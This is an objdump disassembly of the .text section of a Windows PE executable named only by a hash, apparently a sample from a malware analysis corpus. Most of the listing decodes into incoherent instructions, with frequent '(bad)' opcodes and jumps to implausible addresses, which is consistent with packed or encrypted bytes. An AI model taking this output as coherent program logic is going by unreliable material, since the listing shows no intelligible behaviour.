
987de12295f8fa83956a547ca612f5e3cef034d232d8c22579d0426d3aedc15b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
